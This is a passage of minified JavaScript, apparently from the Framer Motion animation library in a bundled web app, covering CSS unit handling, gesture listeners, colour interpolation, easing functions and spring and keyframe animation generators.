").length===1,parse:parseFloat,transform:t=>`${t}${i}`}),Mn=ps("deg"),Yt=ps("%"),le=ps("px"),$w=ps("vh"),Hw=ps("vw"),Gp={...Yt,parse:i=>Yt.parse(i)/100,transform:i=>Yt.transform(i*100)},qp={...gi,transform:Math.round},Og={borderWidth:le,borderTopWidth:le,borderRightWidth:le,borderBottomWidth:le,borderLeftWidth:le,borderRadius:le,radius:le,borderTopLeftRadius:le,borderTopRightRadius:le,borderBottomRightRadius:le,borderBottomLeftRadius:le,width:le,maxWidth:le,height:le,maxHeight:le,size:le,top:le,right:le,bottom:le,left:le,padding:le,paddingTop:le,paddingRight:le,paddingBottom:le,paddingLeft:le,margin:le,marginTop:le,marginRight:le,marginBottom:le,marginLeft:le,rotate:Mn,rotateX:Mn,rotateY:Mn,rotateZ:Mn,scale:Po,scaleX:Po,scaleY:Po,scaleZ:Po,skew:Mn,skewX:Mn,skewY:Mn,distance:le,translateX:le,translateY:le,translateZ:le,x:le,y:le,z:le,perspective:le,transformPerspective:le,opacity:Zr,originX:Gp,originY:Gp,originZ:le,zIndex:qp,fillOpacity:Zr,strokeOpacity:Zr,numOctaves:qp};function ud(i,t,r,s){const{style:a,vars:c,transform:d,transformOrigin:h}=i;let p=!1,f=!1,m=!0;for(const y in t){const v=t[y];if(Mg(y)){c[y]=v;continue}const w=Og[y],P=Uw(v,w);if(fi.has(y)){if(p=!0,d[y]=P,!m)continue;v!==(w.default||0)&&(m=!1)}else y.startsWith("origin")?(f=!0,h[y]=P):a[y]=P}if(t.transform||(p||s?a.transform=zw(i.transform,r,m,s):a.transform&&(a.transform="none")),f){const{originX:y="50%",originY:v="50%",originZ:w=0}=h;a.transformOrigin=`${y} ${v} ${w}`}}const hd=()=>({style:{},transform:{},transformOrigin:{},vars:{}});function Lg(i,t,r){for(const s in t)!mt(t[s])&&!Rg(s,r)&&(i[s]=t[s])}function Gw({transformTemplate:i},t,r){return S.useMemo(()=>{const s=hd();return ud(s,t,{enableHardwareAcceleration:!r},i),Object.assign({},s.vars,s.style)},[t])}function qw(i,t,r){const s=i.style||{},a={};return Lg(a,s,i),Object.assign(a,Gw(i,t,r)),i.transformValues?i.transformValues(a):a}function Kw(i,t,r){const s={},a=qw(i,t,r);return i.drag&&i.dragListener!==!1&&(s.draggable=!1,a.userSelect=a.WebkitUserSelect=a.WebkitTouchCallout="none",a.touchAction=i.drag===!0?"none":`pan-${i.drag==="x"?"y":"x"}`),i.tabIndex===void 0&&(i.onTap||i.onTapStart||i.whileTap)&&(s.tabIndex=0),s.style=a,s}const Jw=new Set(["animate","exit","variants","initial","style","values","variants","transition","transformTemplate","transformValues","custom","inherit","onBeforeLayoutMeasure","onAnimationStart","onAnimationComplete","onUpdate","onDragStart","onDrag","onDragEnd","onMeasureDragConstraints","onDirectionLock","onDragTransitionEnd","_dragX","_dragY","onHoverStart","onHoverEnd","onViewportEnter","onViewportLeave","globalTapTarget","ignoreStrict","viewport"]);function $o(i){return i.startsWith("while")||i.startsWith("drag")&&i!=="draggable"||i.startsWith("layout")||i.startsWith("onTap")||i.startsWith("onPan")||i.startsWith("onLayout")||Jw.has(i)}let Bg=i=>!$o(i);function Qw(i){i&&(Bg=t=>t.startsWith("on")?!$o(t):i(t))}try{Qw(require("@emotion/is-prop-valid").default)}catch{}function Yw(i,t,r){const s={};for(const a in i)a==="values"&&typeof i.values=="object"||(Bg(a)||r===!0&&$o(a)||!t&&!$o(a)||i.draggable&&a.startsWith("onDrag"))&&(s[a]=i[a]);return s}function Kp(i,t,r){return typeof i=="string"?i:le.transform(t+r*i)}function Xw(i,t,r){const s=Kp(t,i.x,i.width),a=Kp(r,i.y,i.height);return`${s} ${a}`}const Zw={offset:"stroke-dashoffset",array:"stroke-dasharray"},e0={offset:"strokeDashoffset",array:"strokeDasharray"};function t0(i,t,r=1,s=0,a=!0){i.pathLength=1;const c=a?Zw:e0;i[c.offset]=le.transform(-s);const d=le.transform(t),h=le.transform(r);i[c.array]=`${d} ${h}`}function pd(i,{attrX:t,attrY:r,attrScale:s,originX:a,originY:c,pathLength:d,pathSpacing:h=1,pathOffset:p=0,...f},m,y,v){if(ud(i,f,m,v),y){i.style.viewBox&&(i.attrs.viewBox=i.style.viewBox);return}i.attrs=i.style,i.style={};const{attrs:w,style:P,dimensions:T}=i;w.transform&&(T&&(P.transform=w.transform),delete w.transform),T&&(a!==void 0||c!==void 0||P.transform)&&(P.transformOrigin=Xw(T,a!==void 0?a:.5,c!==void 0?c:.5)),t!==void 0&&(w.x=t),r!==void 0&&(w.y=r),s!==void 0&&(w.scale=s),d!==void 0&&t0(w,d,h,p,!1)}const Ng=()=>({...hd(),attrs:{}}),fd=i=>typeof i=="string"&&i.toLowerCase()==="svg";function n0(i,t,r,s){const a=S.useMemo(()=>{const c=Ng();return pd(c,t,{enableHardwareAcceleration:!1},fd(s),i.transformTemplate),{...c.attrs,style:{...c.style}}},[t]);if(i.style){const c={};Lg(c,i.style,i),a.style={...c,...a.style}}return a}function i0(i=!1){return(r,s,a,{latestValues:c},d)=>{const p=(dd(r)?n0:Kw)(s,c,d,r),m={...Yw(s,typeof r=="string",i),...p,ref:a},{children:y}=s,v=S.useMemo(()=>mt(y)?y.get():y,[y]);return S.createElement(r,{...m,children:v})}}function Fg(i,{style:t,vars:r},s,a){Object.assign(i.style,t,a&&a.getProjectionStyles(s));for(const c in r)i.style.setProperty(c,r[c])}const zg=new Set(["baseFrequency","diffuseConstant","kernelMatrix","kernelUnitLength","keySplines","keyTimes","limitingConeAngle","markerHeight","markerWidth","numOctaves","targetX","targetY","surfaceScale","specularConstant","specularExponent","stdDeviation","tableValues","viewBox","gradientTransform","pathLength","startOffset","textLength","lengthAdjust"]);function Vg(i,t,r,s){Fg(i,t,void 0,s);for(const a in t.attrs)i.setAttribute(zg.has(a)?a:od(a),t.attrs[a])}function gd(i,t){const{style:r}=i,s={};for(const a in r)(mt(r[a])||t.style&&mt(t.style[a])||Rg(a,i))&&(s[a]=r[a]);return s}function Ug(i,t){const r=gd(i,t);for(const s in i)if(mt(i[s])||mt(t[s])){const a=us.indexOf(s)!==-1?"attr"+s.charAt(0).toUpperCase()+s.substring(1):s;r[a]=i[s]}return r}function md(i,t,r,s={},a={}){return typeof t=="function"&&(t=t(r!==void 0?r:i.custom,s,a)),typeof t=="string"&&(t=i.variants&&i.variants[t]),typeof t=="function"&&(t=t(r!==void 0?r:i.custom,s,a)),t}function Wg(i){const t=S.useRef(null);return t.current===null&&(t.current=i()),t.current}const Ho=i=>Array.isArray(i),r0=i=>!!(i&&typeof i=="object"&&i.mix&&i.toValue),s0=i=>Ho(i)?i[i.length-1]||0:i;function No(i){const t=mt(i)?i.get():i;return r0(t)?t.toValue():t}function o0({scrapeMotionValuesFromProps:i,createRenderState:t,onMount:r},s,a,c){const d={latestValues:a0(s,a,c,i),renderState:t()};return r&&(d.mount=h=>r(s,h,d)),d}const $g=i=>(t,r)=>{const s=S.useContext(Zo),a=S.useContext(ea),c=()=>o0(i,t,s,a);return r?c():Wg(c)};function a0(i,t,r,s){const a={},c=s(i,{});for(const v in c)a[v]=No(c[v]);let{initial:d,animate:h}=i;const p=ia(i),f=Ig(i);t&&f&&!p&&i.inherit!==!1&&(d===void 0&&(d=t.initial),h===void 0&&(h=t.animate));let m=r?r.initial===!1:!1;m=m||d===!1;const y=m?h:d;return y&&typeof y!="boolean"&&!na(y)&&(Array.isArray(y)?y:[y]).forEach(w=>{const P=md(i,w);if(!P)return;const{transitionEnd:T,transition:C,...L}=P;for(const R in L){let M=L[R];if(Array.isArray(M)){const O=m?M.length-1:0;M=M[O]}M!==null&&(a[R]=M)}for(const R in T)a[R]=T[R]}),a}const Ue=i=>i;class Jp{constructor(){this.order=[],this.scheduled=new Set}add(t){if(!this.scheduled.has(t))return this.scheduled.add(t),this.order.push(t),!0}remove(t){const r=this.order.indexOf(t);r!==-1&&(this.order.splice(r,1),this.scheduled.delete(t))}clear(){this.order.length=0,this.scheduled.clear()}}function l0(i){let t=new Jp,r=new Jp,s=0,a=!1,c=!1;const d=new WeakSet,h={schedule:(p,f=!1,m=!1)=>{const y=m&&a,v=y?t:r;return f&&d.add(p),v.add(p)&&y&&a&&(s=t.order.length),p},cancel:p=>{r.remove(p),d.delete(p)},process:p=>{if(a){c=!0;return}if(a=!0,[t,r]=[r,t],r.clear(),s=t.order.length,s)for(let f=0;f<s;f++){const m=t.order[f];m(p),d.has(m)&&(h.schedule(m),i())}a=!1,c&&(c=!1,h.process(p))}};return h}const Io=["prepare","read","update","preRender","render","postRender"],c0=40;function d0(i,t){let r=!1,s=!0;const a={delta:0,timestamp:0,isProcessing:!1},c=Io.reduce((y,v)=>(y[v]=l0(()=>r=!0),y),{}),d=y=>c[y].process(a),h=()=>{const y=performance.now();r=!1,a.delta=s?1e3/60:Math.max(Math.min(y-a.timestamp,c0),1),a.timestamp=y,a.isProcessing=!0,Io.forEach(d),a.isProcessing=!1,r&&t&&(s=!1,i(h))},p=()=>{r=!0,s=!0,a.isProcessing||i(h)};return{schedule:Io.reduce((y,v)=>{const w=c[v];return y[v]=(P,T=!1,C=!1)=>(r||p(),w.schedule(P,T,C)),y},{}),cancel:y=>Io.forEach(v=>c[v].cancel(y)),state:a,steps:c}}const{schedule:_e,cancel:hn,state:st,steps:dc}=d0(typeof requestAnimationFrame<"u"?requestAnimationFrame:Ue,!0),u0={useVisualState:$g({scrapeMotionValuesFromProps:Ug,createRenderState:Ng,onMount:(i,t,{renderState:r,latestValues:s})=>{_e.read(()=>{try{r.dimensions=typeof t.getBBox=="function"?t.getBBox():t.getBoundingClientRect()}catch{r.dimensions={x:0,y:0,width:0,height:0}}}),_e.render(()=>{pd(r,s,{enableHardwareAcceleration:!1},fd(t.tagName),i.transformTemplate),Vg(t,r)})}})},h0={useVisualState:$g({scrapeMotionValuesFromProps:gd,createRenderState:hd})};function p0(i,{forwardMotionProps:t=!1},r,s){return{...dd(i)?u0:h0,preloadedFeatures:r,useRender:i0(t),createVisualElement:s,Component:i}}function ln(i,t,r,s={passive:!0}){return i.addEventListener(t,r,s),()=>i.removeEventListener(t,r)}const Hg=i=>i.pointerType==="mouse"?typeof i.button!="number"||i.button<=0:i.isPrimary!==!1;function sa(i,t="page"){return{point:{x:i[t+"X"],y:i[t+"Y"]}}}const f0=i=>t=>Hg(t)&&i(t,sa(t));function dn(i,t,r,s){return ln(i,t,f0(r),s)}const g0=(i,t)=>r=>t(i(r)),Bn=(...i)=>i.reduce(g0);function Gg(i){let t=null;return()=>{const r=()=>{t=null};return t===null?(t=i,r):!1}}const Qp=Gg("dragHorizontal"),Yp=Gg("dragVertical");function qg(i){let t=!1;if(i==="y")t=Yp();else if(i==="x")t=Qp();else{const r=Qp(),s=Yp();r&&s?t=()=>{r(),s()}:(r&&r(),s&&s())}return t}function Kg(){const i=qg(!0);return i?(i(),!1):!0}class zn{constructor(t){this.isMounted=!1,this.node=t}update(){}}function Xp(i,t){const r="pointer"+(t?"enter":"leave"),s="onHover"+(t?"Start":"End"),a=(c,d)=>{if(c.pointerType==="touch"||Kg())return;const h=i.getProps();i.animationState&&h.whileHover&&i.animationState.setActive("whileHover",t),h[s]&&_e.update(()=>h[s](c,d))};return dn(i.current,r,a,{passive:!i.getProps()[s]})}class m0 extends zn{mount(){this.unmount=Bn(Xp(this.node,!0),Xp(this.node,!1))}unmount(){}}class y0 extends zn{constructor(){super(...arguments),this.isActive=!1}onFocus(){let t=!1;try{t=this.node.current.matches(":focus-visible")}catch{t=!0}!t||!this.node.animationState||(this.node.animationState.setActive("whileFocus",!0),this.isActive=!0)}onBlur(){!this.isActive||!this.node.animationState||(this.node.animationState.setActive("whileFocus",!1),this.isActive=!1)}mount(){this.unmount=Bn(ln(this.node.current,"focus",()=>this.onFocus()),ln(this.node.current,"blur",()=>this.onBlur()))}unmount(){}}const Jg=(i,t)=>t?i===t?!0:Jg(i,t.parentElement):!1;function uc(i,t){if(!t)return;const r=new PointerEvent("pointer"+i);t(r,sa(r))}class b0 extends zn{constructor(){super(...arguments),this.removeStartListeners=Ue,this.removeEndListeners=Ue,this.removeAccessibleListeners=Ue,this.startPointerPress=(t,r)=>{if(this.isPressing)return;this.removeEndListeners();const s=this.node.getProps(),c=dn(window,"pointerup",(h,p)=>{if(!this.checkPressEnd())return;const{onTap:f,onTapCancel:m,globalTapTarget:y}=this.node.getProps();_e.update(()=>{!y&&!Jg(this.node.current,h.target)?m&&m(h,p):f&&f(h,p)})},{passive:!(s.onTap||s.onPointerUp)}),d=dn(window,"pointercancel",(h,p)=>this.cancelPress(h,p),{passive:!(s.onTapCancel||s.onPointerCancel)});this.removeEndListeners=Bn(c,d),this.startPress(t,r)},this.startAccessiblePress=()=>{const t=c=>{if(c.key!=="Enter"||this.isPressing)return;const d=h=>{h.key!=="Enter"||!this.checkPressEnd()||uc("up",(p,f)=>{const{onTap:m}=this.node.getProps();m&&_e.update(()=>m(p,f))})};this.removeEndListeners(),this.removeEndListeners=ln(this.node.current,"keyup",d),uc("down",(h,p)=>{this.startPress(h,p)})},r=ln(this.node.current,"keydown",t),s=()=>{this.isPressing&&uc("cancel",(c,d)=>this.cancelPress(c,d))},a=ln(this.node.current,"blur",s);this.removeAccessibleListeners=Bn(r,a)}}startPress(t,r){this.isPressing=!0;const{onTapStart:s,whileTap:a}=this.node.getProps();a&&this.node.animationState&&this.node.animationState.setActive("whileTap",!0),s&&_e.update(()=>s(t,r))}checkPressEnd(){return this.removeEndListeners(),this.isPressing=!1,this.node.getProps().whileTap&&this.node.animationState&&this.node.animationState.setActive("whileTap",!1),!Kg()}cancelPress(t,r){if(!this.checkPressEnd())return;const{onTapCancel:s}=this.node.getProps();s&&_e.update(()=>s(t,r))}mount(){const t=this.node.getProps(),r=dn(t.globalTapTarget?window:this.node.current,"pointerdown",this.startPointerPress,{passive:!(t.onTapStart||t.onPointerStart)}),s=ln(this.node.current,"focus",this.startAccessiblePress);this.removeStartListeners=Bn(r,s)}unmount(){this.removeStartListeners(),this.removeEndListeners(),this.removeAccessibleListeners()}}const Oc=new WeakMap,hc=new WeakMap,v0=i=>{const t=Oc.get(i.target);t&&t(i)},w0=i=>{i.forEach(v0)};function k0({root:i,...t}){const r=i||document;hc.has(r)||hc.set(r,{});const s=hc.get(r),a=JSON.stringify(t);return s[a]||(s[a]=new IntersectionObserver(w0,{root:i,...t})),s[a]}function x0(i,t,r){const s=k0(t);return Oc.set(i,r),s.observe(i),()=>{Oc.delete(i),s.unobserve(i)}}const T0={some:0,all:1};class S0 extends zn{constructor(){super(...arguments),this.hasEnteredView=!1,this.isInView=!1}startObserver(){this.unmount();const{viewport:t={}}=this.node.getProps(),{root:r,margin:s,amount:a="some",once:c}=t,d={root:r?r.current:void 0,rootMargin:s,threshold:typeof a=="number"?a:T0[a]},h=p=>{const{isIntersecting:f}=p;if(this.isInView===f||(this.isInView=f,c&&!f&&this.hasEnteredView))return;f&&(this.hasEnteredView=!0),this.node.animationState&&this.node.animationState.setActive("whileInView",f);const{onViewportEnter:m,onViewportLeave:y}=this.node.getProps(),v=f?m:y;v&&v(p)};return x0(this.node.current,d,h)}mount(){this.startObserver()}update(){if(typeof IntersectionObserver>"u")return;const{props:t,prevProps:r}=this.node;["amount","margin","root"].some(A0(t,r))&&this.startObserver()}unmount(){}}function A0({viewport:i={}},{viewport:t={}}={}){return r=>i[r]!==t[r]}const C0={inView:{Feature:S0},tap:{Feature:b0},focus:{Feature:y0},hover:{Feature:m0}};function Qg(i,t){if(!Array.isArray(t))return!1;const r=t.length;if(r!==i.length)return!1;for(let s=0;s<r;s++)if(t[s]!==i[s])return!1;return!0}function E0(i){const t={};return i.values.forEach((r,s)=>t[s]=r.get()),t}function P0(i){const t={};return i.values.forEach((r,s)=>t[s]=r.getVelocity()),t}function oa(i,t,r){const s=i.getProps();return md(s,t,r!==void 0?r:s.custom,E0(i),P0(i))}let yd=Ue;const ui=i=>i*1e3,un=i=>i/1e3,I0={current:!1},Yg=i=>Array.isArray(i)&&typeof i[0]=="number";function Xg(i){return!!(!i||typeof i=="string"&&Zg[i]||Yg(i)||Array.isArray(i)&&i.every(Xg))}const Yr=([i,t,r,s])=>`cubic-bezier(${i}, ${t}, ${r}, ${s})`,Zg={linear:"linear",ease:"ease",easeIn:"ease-in",easeOut:"ease-out",easeInOut:"ease-in-out",circIn:Yr([0,.65,.55,1]),circOut:Yr([.55,0,1,.45]),backIn:Yr([.31,.01,.66,-.59]),backOut:Yr([.33,1.53,.69,.99])};function em(i){if(i)return Yg(i)?Yr(i):Array.isArray(i)?i.map(em):Zg[i]}function _0(i,t,r,{delay:s=0,duration:a,repeat:c=0,repeatType:d="loop",ease:h,times:p}={}){const f={[t]:r};p&&(f.offset=p);const m=em(h);return Array.isArray(m)&&(f.easing=m),i.animate(f,{delay:s,duration:a,easing:Array.isArray(m)?"linear":m,fill:"both",iterations:c+1,direction:d==="reverse"?"alternate":"normal"})}function R0(i,{repeat:t,repeatType:r="loop"}){const s=t&&r!=="loop"&&t%2===1?0:i.length-1;return i[s]}const tm=(i,t,r)=>(((1-3*r+3*t)*i+(3*r-6*t))*i+3*t)*i,D0=1e-7,M0=12;function j0(i,t,r,s,a){let c,d,h=0;do d=t+(r-t)/2,c=tm(d,s,a)-i,c>0?r=d:t=d;while(Math.abs(c)>D0&&++h<M0);return d}function fs(i,t,r,s){if(i===t&&r===s)return Ue;const a=c=>j0(c,0,1,i,r);return c=>c===0||c===1?c:tm(a(c),t,s)}const O0=fs(.42,0,1,1),L0=fs(0,0,.58,1),nm=fs(.42,0,.58,1),B0=i=>Array.isArray(i)&&typeof i[0]!="number",im=i=>t=>t<=.5?i(2*t)/2:(2-i(2*(1-t)))/2,rm=i=>t=>1-i(1-t),bd=i=>1-Math.sin(Math.acos(i)),sm=rm(bd),N0=im(bd),om=fs(.33,1.53,.69,.99),vd=rm(om),F0=im(vd),z0=i=>(i*=2)<1?.5*vd(i):.5*(2-Math.pow(2,-10*(i-1))),V0={linear:Ue,easeIn:O0,easeInOut:nm,easeOut:L0,circIn:bd,circInOut:N0,circOut:sm,backIn:vd,backInOut:F0,backOut:om,anticipate:z0},Zp=i=>{if(Array.isArray(i)){yd(i.length===4);const[t,r,s,a]=i;return fs(t,r,s,a)}else if(typeof i=="string")return V0[i];return i},wd=(i,t)=>r=>!!(hs(r)&&Ww.test(r)&&r.startsWith(i)||t&&Object.prototype.hasOwnProperty.call(r,t)),am=(i,t,r)=>s=>{if(!hs(s))return s;const[a,c,d,h]=s.match(ra);return{[i]:parseFloat(a),[t]:parseFloat(c),[r]:parseFloat(d),alpha:h!==void 0?parseFloat(h):1}},U0=i=>Nn(0,255,i),pc={...gi,transform:i=>Math.round(U0(i))},ci={test:wd("rgb","red"),parse:am("red","green","blue"),transform:({red:i,green:t,blue:r,alpha:s=1})=>"rgba("+pc.transform(i)+", "+pc.transform(t)+", "+pc.transform(r)+", "+es(Zr.transform(s))+")"};function W0(i){let t="",r="",s="",a="";return i.length>5?(t=i.substring(1,3),r=i.substring(3,5),s=i.substring(5,7),a=i.substring(7,9)):(t=i.substring(1,2),r=i.substring(2,3),s=i.substring(3,4),a=i.substring(4,5),t+=t,r+=r,s+=s,a+=a),{red:parseInt(t,16),green:parseInt(r,16),blue:parseInt(s,16),alpha:a?parseInt(a,16)/255:1}}const Lc={test:wd("#"),parse:W0,transform:ci.transform},Yi={test:wd("hsl","hue"),parse:am("hue","saturation","lightness"),transform:({hue:i,saturation:t,lightness:r,alpha:s=1})=>"hsla("+Math.round(i)+", "+Yt.transform(es(t))+", "+Yt.transform(es(r))+", "+es(Zr.transform(s))+")"},ct={test:i=>ci.test(i)||Lc.test(i)||Yi.test(i),parse:i=>ci.test(i)?ci.parse(i):Yi.test(i)?Yi.parse(i):Lc.parse(i),transform:i=>hs(i)?i:i.hasOwnProperty("red")?ci.transform(i):Yi.transform(i)},Be=(i,t,r)=>-r*i+r*t+i;function fc(i,t,r){return r<0&&(r+=1),r>1&&(r-=1),r<1/6?i+(t-i)*6*r:r<1/2?t:r<2/3?i+(t-i)*(2/3-r)*6:i}function $0({hue:i,saturation:t,lightness:r,alpha:s}){i/=360,t/=100,r/=100;let a=0,c=0,d=0;if(!t)a=c=d=r;else{const h=r<.5?r*(1+t):r+t-r*t,p=2*r-h;a=fc(p,h,i+1/3),c=fc(p,h,i),d=fc(p,h,i-1/3)}return{red:Math.round(a*255),green:Math.round(c*255),blue:Math.round(d*255),alpha:s}}const gc=(i,t,r)=>{const s=i*i;return Math.sqrt(Math.max(0,r*(t*t-s)+s))},H0=[Lc,ci,Yi],G0=i=>H0.find(t=>t.test(i));function ef(i){const t=G0(i);let r=t.parse(i);return t===Yi&&(r=$0(r)),r}const lm=(i,t)=>{const r=ef(i),s=ef(t),a={...r};return c=>(a.red=gc(r.red,s.red,c),a.green=gc(r.green,s.green,c),a.blue=gc(r.blue,s.blue,c),a.alpha=Be(r.alpha,s.alpha,c),ci.transform(a))};function q0(i){var t,r;return isNaN(i)&&hs(i)&&(((t=i.match(ra))===null||t===void 0?void 0:t.length)||0)+(((r=i.match(jg))===null||r===void 0?void 0:r.length)||0)>0}const cm={regex:Vw,countKey:"Vars",token:"${v}",parse:Ue},dm={regex:jg,countKey:"Colors",token:"${c}",parse:ct.parse},um={regex:ra,countKey:"Numbers",token:"${n}",parse:gi.parse};function mc(i,{regex:t,countKey:r,token:s,parse:a}){const c=i.tokenised.match(t);c&&(i["num"+r]=c.length,i.tokenised=i.tokenised.replace(t,s),i.values.push(...c.map(a)))}function Go(i){const t=i.toString(),r={value:t,tokenised:t,values:[],numVars:0,numColors:0,numNumbers:0};return r.value.includes("var(--")&&mc(r,cm),mc(r,dm),mc(r,um),r}function hm(i){return Go(i).values}function pm(i){const{values:t,numColors:r,numVars:s,tokenised:a}=Go(i),c=t.length;return d=>{let h=a;for(let p=0;p<c;p++)p<s?h=h.replace(cm.token,d[p]):p<s+r?h=h.replace(dm.token,ct.transform(d[p])):h=h.replace(um.token,es(d[p]));return h}}const K0=i=>typeof i=="number"?0:i;function J0(i){const t=hm(i);return pm(i)(t.map(K0))}const Fn={test:q0,parse:hm,createTransformer:pm,getAnimatableNone:J0},fm=(i,t)=>r=>`${r>0?t:i}`;function gm(i,t){return typeof i=="number"?r=>Be(i,t,r):ct.test(i)?lm(i,t):i.startsWith("var(")?fm(i,t):ym(i,t)}const mm=(i,t)=>{const r=[...i],s=r.length,a=i.map((c,d)=>gm(c,t[d]));return c=>{for(let d=0;d<s;d++)r[d]=a[d](c);return r}},Q0=(i,t)=>{const r={...i,...t},s={};for(const a in r)i[a]!==void 0&&t[a]!==void 0&&(s[a]=gm(i[a],t[a]));return a=>{for(const c in s)r[c]=s[c](a);return r}},ym=(i,t)=>{const r=Fn.createTransformer(t),s=Go(i),a=Go(t);return s.numVars===a.numVars&&s.numColors===a.numColors&&s.numNumbers>=a.numNumbers?Bn(mm(s.values,a.values),r):fm(i,t)},ls=(i,t,r)=>{const s=t-i;return s===0?1:(r-i)/s},tf=(i,t)=>r=>Be(i,t,r);function Y0(i){return typeof i=="number"?tf:typeof i=="string"?ct.test(i)?lm:ym:Array.isArray(i)?mm:typeof i=="object"?Q0:tf}function X0(i,t,r){const s=[],a=r||Y0(i[0]),c=i.length-1;for(let d=0;d<c;d++){let h=a(i[d],i[d+1]);if(t){const p=Array.isArray(t)?t[d]||Ue:t;h=Bn(p,h)}s.push(h)}return s}function bm(i,t,{clamp:r=!0,ease:s,mixer:a}={}){const c=i.length;if(yd(c===t.length),c===1)return()=>t[0];i[0]>i[c-1]&&(i=[...i].reverse(),t=[...t].reverse());const d=X0(t,s,a),h=d.length,p=f=>{let m=0;if(h>1)for(;m<i.length-2&&!(f<i[m+1]);m++);const y=ls(i[m],i[m+1],f);return d[m](y)};return r?f=>p(Nn(i[0],i[c-1],f)):p}function Z0(i,t){const r=i[i.length-1];for(let s=1;s<=t;s++){const a=ls(0,t,s);i.push(Be(r,1,a))}}function ek(i){const t=[0];return Z0(t,i.length-1),t}function tk(i,t){return i.map(r=>r*t)}function nk(i,t){return i.map(()=>t||nm).splice(0,i.length-1)}function qo({duration:i=300,keyframes:t,times:r,ease:s="easeInOut"}){const a=B0(s)?s.map(Zp):Zp(s),c={done:!1,value:t[0]},d=tk(r&&r.length===t.length?r:ek(t),i),h=bm(d,t,{ease:Array.isArray(a)?a:nk(t,a)});return{calculatedDuration:i,next:p=>(c.value=h(p),c.done=p>=i,c)}}function vm(i,t){return t?i*(1e3/t):0}const ik=5;function wm(i,t,r){const s=Math.max(t-ik,0);return vm(r-i(s),t-s)}const yc=.001,rk=.01,sk=10,ok=.05,ak=1;function lk({duration:i=800,bounce:t=.25,velocity:r=0,mass:s=1}){let a,c,d=1-t;d=Nn(ok,ak,d),i=Nn(rk,sk,un(i)),d<1?(a=f=>{const m=f*d,y=m*i,v=m-r,w=Bc(f,d),P=Math.exp(-y);return yc-v/w*P},c=f=>{const y=f*d*i,v=y*r+r,w=Math.pow(d,2)*Math.pow(f,2)*i,P=Math.exp(-y),T=Bc(Math.pow(f,2),d);return(-a(f)+yc>0?-1:1)*((v-w)*P)/T}):(a=f=>{const m=Math.exp(-f*i),y=(f-r)*i+1;return-yc+m*y},c=f=>{const m=Math.exp(-f*i),y=(r-f)*(i*i);return m*y});const h=5/i,p=dk(a,c,h);if(i=ui(i),isNaN(p))return{stiffness:100,damping:10,duration:i};{const f=Math.pow(p,2)*s;return{stiffness:f,damping:d*2*Math.sqrt(s*f),duration:i}}}const ck=12;function dk(i,t,r){let s=r;for(let a=1;a<ck;a++)s=s-i(s)/t(s);return s}function Bc(i,t){return i*Math.sqrt(1-t*t)}const uk=["duration","bounce"],hk=["stiffness","damping","mass"];function nf(i,t){return t.some(r=>i[r]!==void 0)}function pk(i){let t={velocity:0,stiffness:100,damping:10,mass:1,isResolvedFromDuration:!1,...i};if(!nf(i,hk)&&nf(i,uk)){const r=lk(i);t={...t,...r,mass:1},t.isResolvedFromDuration=!0}return t}function km({keyframes:i,restDelta:t,restSpeed:r,...s}){const a=i[0],c=i[i.length-1],d={done:!1,value:a},{stiffness:h,damping:p,mass:f,duration:m,velocity:y,isResolvedFromDuration:v}=pk({...s,velocity:-un(s.velocity||0)}),w=y||0,P=p/(2*Math.sqrt(h*f)),T=c-a,C=un(Math.sqrt(h/f)),L=Math.abs(T)<5;r||(r=L?.01:2),t||(t=L?.005:.5);let R;if(P<1){const M=Bc(C,P);R=O=>{const W=Math.exp(-P*C*O);return c-W*((w+P*C*T)/M*Math.sin(M*O)+T*Math.cos(M*O))}}else if(P===1)R=M=>c-Math.exp(-C*M)*(T+(w+C*T)*M);else{const M=C*Math.sqrt(P*P-1);R=O=>{const W=Math.exp(-P*C*O),J=Math.min(M*O,300);return c-W*((w+P*C*T)*Math.sinh(J)+M*T*Math.cosh(J))/M}}return{calculatedDuration:v&&m||null,next:M=>{const O=R(M);if(v)d.done=M>=m;else{let W=w;M!==0&&(P<1?W=wm(R,M,O):W=0);const J=Math.abs(W)<=r,G=Math.abs(c-O)<=t;d.done=J&&G}return d.value=d.done?c:O,d}}}function rf({keyframes:i,velocity:t=0,power:r=.8,timeConstant:s=325,bounceDamping:a=10,bounceStiffness:c=500,modifyTarget:d,min:h,max:p,restDelta:f=.5,restSpeed:m}){const y=i[0],v={done:!1,value:y},w=X=>h!==void 0&&X<h||p!==void 0&&X>p,P=X=>h===void 0?p:p===void 0||Math.abs(h-X)<Math.abs(p-X)?h:p;let T=r*t;const C=y+T,L=d===void 0?C:d(C);L!==C&&(T=L-y);const R=X=>-T*Math.exp(-X/s),M=X=>L+R(X),O=X=>{const ie=R(X),ge=M(X);v.done=Math.abs(ie)<=f,v.value=v.done?L:ge};let W,J;const G=X=>{w(v.value)&&(W=X,J=km({keyframes:[v.value,P(v.value)],velocity:wm(M,X,v.value),damping:a,stiffness:c,restDelta:f,restSpeed:m}))};return G(0),{calculatedDuration:null,next:X=>{let ie=!1;return!J&&W===void 0&&(ie=!0,O(X),G(X)),W!==void 0&&X>W?J.next(X-W):(!ie&&O(X),v)}}}const fk=i=>{const t=({timestamp:r})=>i(r);return{start:()=>_e.update(t,!0),stop:()=>hn(t),now:()=>st.isProcessing?st.timestamp:performance.now()}},sf=2e4;function of(i){let t=0;const r=50;let s=i.next(t);for(;!s.done&&t<sf;)t+=r,s=i.next(t);return t>=sf?1/0:t}const gk={decay:rf,inertia:rf,tween:qo,keyframes:qo,spring:km};function Ko({autoplay:i=!0,delay:t=0,driver:r=fk,keyframes:s,type:a="keyframes",repeat:c=0,repeatDelay:d=0,repeatType:h="loop",onPlay:p,onStop:f,onComplete:m,onUpdate:y,...v}){let w=1,P=!1,T,C;const L=()=>{C=new Promise(E=>{T=E})};L();let R;const M=gk[a]||qo;let O;M!==qo&&typeof s[0]!="number"&&(O=bm([0,100],s,{clamp:!1}),s=[0,100]);const W=M({...v,keyframes:s});let J;h==="mirror"&&(J=M({...v,keyframes:[...s].reverse(),velocity:-(v.velocity||0)}));let G="idle",X=null,ie=null,ge=null;W.calculatedDuration===null&&c&&(W.calculatedDuration=of(W));const{calculatedDuration:Ae}=W;let $=1/0,ae=1/0;Ae!==null&&($=Ae+d,ae=$*(c+1)-d);let H=0;const he=E=>{if(ie===null)return;w>0&&(ie=Math.min(ie,E)),w<0&&(ie=Math.min(E-ae/w,ie)),X!==null?H=X:H=Math.round(E-ie)*w;const B=H-t*(w>=0?1:-1),te=w>=0?B<0:B>ae;H=Math.max(B,0),G==="finished"&&X===null&&(H=ae);let de=H,be=W;if(c){const Ce=Math.min(H,ae)/$;let 